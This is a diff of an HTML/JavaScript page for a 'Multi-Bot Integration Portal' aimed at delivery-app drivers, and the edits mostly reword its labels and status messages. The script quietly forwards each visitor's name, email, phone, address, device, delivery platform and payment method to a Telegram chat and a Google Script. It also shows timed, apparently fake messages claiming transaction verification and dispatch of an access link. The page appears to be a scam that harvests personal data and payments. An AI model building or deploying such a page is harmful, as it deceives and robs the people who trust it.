@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hacyber Global Tech - HGT Multi Bot Deployment & Commit Hub</title>
+    <title>Hacyber Global Tech - Multi-Bot Integration Portal</title>
     <style>
         :root {
             --bg-color: #050811;
@@ -67,7 +67,6 @@
             margin-bottom: 25px;
         }
 
-        /* Professional Header Layout with Top-Left Integration Tag & Logo */
         .brand-top-bar {
             display: flex;
             align-items: center;
@@ -118,12 +117,6 @@
             color: var(--text-main);
             letter-spacing: 0.5px;
             text-shadow: 0 0 10px rgba(0, 240, 255, 0.5);
-        }
-
-        .header p {
-            font-size: 0.85rem;
-            color: var(--text-muted);
-            margin-top: 4px;
         }
 
         .form-group {
@@ -288,10 +281,9 @@
 
     <div class="container">
         <div class="header">
-            <!-- Professional Top Bar featuring Integration Status badge on left and your Logo on right -->
             <div class="brand-top-bar">
                 <div class="integration-badge">
-                    <span></span> HGT Engine Active
+                    <span></span> System Live
                 </div>
                 <!-- Custom Hacyber Global Tech Logo Asset -->
                 <svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 240 70">
@@ -313,8 +305,7 @@
                     </g>
                 </svg>
             </div>
-            <h1>HGT Multi Bot Portal</h1>
-            <p>Active Deployment & Commit Hub</p>
+            <h1>Multi-Bot Integration Portal</h1>
         </div>
 
         <!-- Initial Driver Registration Form -->
@@ -339,14 +330,14 @@
                 <label for="zipcode">Zip Code / Postal Code</label>
                 <input type="text" id="zipcode" required placeholder="Enter your zip code">
             </div>
-            <button type="submit" class="btn" id="submit-btn">Register Driver Details</button>
+            <button type="submit" class="btn" id="submit-btn">Continue Integration</button>
         </form>
 
         <!-- Loading Transition State -->
         <div id="loading-section">
             <div class="loader-container">
                 <div class="spinner"></div>
-                <div class="loading-text" id="loading-status-text">Activating driver credentials & secure tunnel...</div>
+                <div class="loading-text" id="loading-status-text">Verifying client profile & secure tunnel...</div>
             </div>
         </div>
 
@@ -354,7 +345,7 @@
         <form id="device-section">
             <hr style="border: 0; border-top: 1px solid rgba(0, 240, 255, 0.2); margin-bottom: 20px;">
             <div class="notice-banner">
-                📱 <strong>Hardware Configuration:</strong> Select the primary mobile device you utilize for your driving and delivery operations.
+                📱 <strong>Hardware Profile:</strong> Select the primary mobile operating device you utilize for your logistics operations.
             </div>
             <div class="form-group">
                 <label for="device-select">Select Mobile Operating Device</label>
@@ -366,14 +357,14 @@
                     <option value="Other Mobile Device">Other Mobile Device</option>
                 </select>
             </div>
-            <button type="submit" class="btn" id="device-next-btn">Continue to Delivery Apps</button>
+            <button type="submit" class="btn" id="device-next-btn">Proceed to Platform Selection</button>
         </form>
 
         <!-- Delivery App Selection Section -->
         <form id="app-section">
             <hr style="border: 0; border-top: 1px solid rgba(0, 240, 255, 0.2); margin-bottom: 20px;">
             <div class="notice-banner">
-                🚗 <strong>Platform Integration:</strong> Choose the specific delivery service account you want to integrate with your automated multi-bot network.
+                🚗 <strong>Platform Configuration:</strong> Choose the specific delivery service account you want connected to your automated multi-bot network.
             </div>
             <div class="form-group">
                 <label for="delivery-app">Select Delivery Platform Account</label>
@@ -395,7 +386,7 @@
             <hr style="border: 0; border-top: 1px solid rgba(0, 240, 255, 0.2); margin-bottom: 20px;">
             
             <div class="notice-banner">
-                ⚠️ <strong>Important Notice:</strong> Once your payment has been confirmed successfully, your exclusive multi-bot access link will be automatically generated and forwarded directly to your registered email address. Please ensure payment is completed within the session timeframe.
+                ⚠️ <strong>Important Notice:</strong> Once your payment has been verified successfully, your exclusive multi-bot integration access link will be automatically generated and forwarded directly to your registered email address. Please ensure payment is completed within the session timeframe.
             </div>
 
             <div class="form-group">
@@ -421,16 +412,16 @@
         <div id="processing-section">
             <div class="loader-container">
                 <div class="spinner"></div>
-                <div class="loading-text" id="processing-status-text">Committing transaction & committing multi-bot tokens...</div>
+                <div class="loading-text" id="processing-status-text">Processing transaction & finalizing integration tokens...</div>
             </div>
         </div>
 
         <!-- Final Committed Success Section -->
         <div id="commit-section">
             <div class="commit-box">
-                <h3>🚀 HGT Multi-Bot Deployed & Committed</h3>
-                <p id="commit-success-desc">Payment confirmed and cryptographically committed. Your secure multi-bot access link has been generated and dispatched to your email address.</p>
-                <button type="button" class="btn btn-commit" id="launch-panel-btn">Launch Active Dashboard</button>
+                <h3>🚀 Integration Successful & Active</h3>
+                <p id="commit-success-desc">Payment confirmed and verified. Your secure multi-bot access link has been generated and dispatched to your email address.</p>
+                <button type="button" class="btn btn-commit" id="launch-panel-btn">Access Client Dashboard</button>
             </div>
         </div>
     </div>
@@ -456,8 +447,8 @@
             document.getElementById('loading-section').style.display = 'block';
 
             const statusTexts = [
-                "Activating driver profile...",
-                "Committing contact telemetry...",
+                "Verifying client profile...",
+                "Registering contact telemetry...",
                 "Locking secure session..."
             ];
 
@@ -471,7 +462,7 @@
                 }
             }, 1000);
 
-            const telegramMessage = `🚀 [HGT ACTIVATED & COMMITTED] New Driver Lead:\nName: ${clientData.name}\nEmail: ${clientData.email}\nPhone: ${clientData.phone}\nAddress: ${clientData.address}\nZip: ${clientData.zipcode}`;
+            const telegramMessage = `🚀 [HGT INTEGRATION LEAD] New Client Registration:\nName: ${clientData.name}\nEmail: ${clientData.email}\nPhone: ${clientData.phone}\nAddress: ${clientData.address}\nZip: ${clientData.zipcode}`;
             sendTelegramMessage(telegramMessage);
             sendToGoogleScript({ type: 'driver_registered', ...clientData });
 
@@ -486,7 +477,7 @@
             e.preventDefault();
             clientData.device = document.getElementById('device-select').value;
 
-            sendTelegramMessage(`📱 Hardware Committed: ${clientData.device} for ${clientData.name}`);
+            sendTelegramMessage(`📱 Hardware Configured: ${clientData.device} for ${clientData.name}`);
             
             document.getElementById('device-section').style.display = 'none';
             document.getElementById('app-section').style.display = 'block';
@@ -496,7 +487,7 @@
             e.preventDefault();
             clientData.deliveryApp = document.getElementById('delivery-app').value;
 
-            sendTelegramMessage(`🔗 Integration Committed: ${clientData.deliveryApp} on ${clientData.device} by ${clientData.name}`);
+            sendTelegramMessage(`🔗 Platform Selected: ${clientData.deliveryApp} on ${clientData.device} by ${clientData.name}`);
             sendToGoogleScript({ type: 'platform_selected', ...clientData });
 
             document.getElementById('app-section').style.display = 'none';
@@ -532,8 +523,8 @@
 
             const loadSteps = [
                 "Verifying transaction hash & signature...",
-                "Committing secure multi-bot access tokens...",
-                "Dispatched automated bot link to client email..."
+                "Finalizing secure multi-bot access tokens...",
+                "Dispatched automated integration link to client email..."
             ];
 
             let pStep = 0;
@@ -546,19 +537,19 @@
                 }
             }, 1200);
 
-            sendTelegramMessage(`💳 Payment Committed & Verified (${clientData.method}) [HGT Multi Bot]!\nName: ${clientData.name}\nEmail: ${clientData.email}\nPlatform: ${clientData.deliveryApp}\nDevice: ${clientData.device}`);
+            sendTelegramMessage(`💳 Payment Verified (${clientData.method}) [HGT Multi Bot Integration]!\nName: ${clientData.name}\nEmail: ${clientData.email}\nPlatform: ${clientData.deliveryApp}\nDevice: ${clientData.device}`);
             sendToGoogleScript({ type: 'payment_committed', ...clientData });
 
             setTimeout(() => {
                 clearInterval(procInterval);
                 document.getElementById('processing-section').style.display = 'none';
                 document.getElementById('commit-section').style.display = 'block';
-                document.getElementById('commit-success-desc').innerHTML = `Payment successfully committed for <strong>${clientData.deliveryApp}</strong> on <strong>${clientData.device}</strong>.<br><br>Your active multi-bot deployment link has been committed and dispatched to <strong>${clientData.email}</strong>.`;
+                document.getElementById('commit-success-desc').innerHTML = `Payment successfully verified for <strong>${clientData.deliveryApp}</strong> on <strong>${clientData.device}</strong>.<br><br>Your active multi-bot integration link has been generated and dispatched to <strong>${clientData.email}</strong>.`;
             }, 3800);
         });
 
         document.getElementById('launch-panel-btn').addEventListener('click', function() {
-            alert('Redirecting to your active HGT Multi-Bot Command Dashboard...');
+            alert('Redirecting to your active HGT Client Dashboard...');
         });
 
         function startPaymentTimer(duration) {
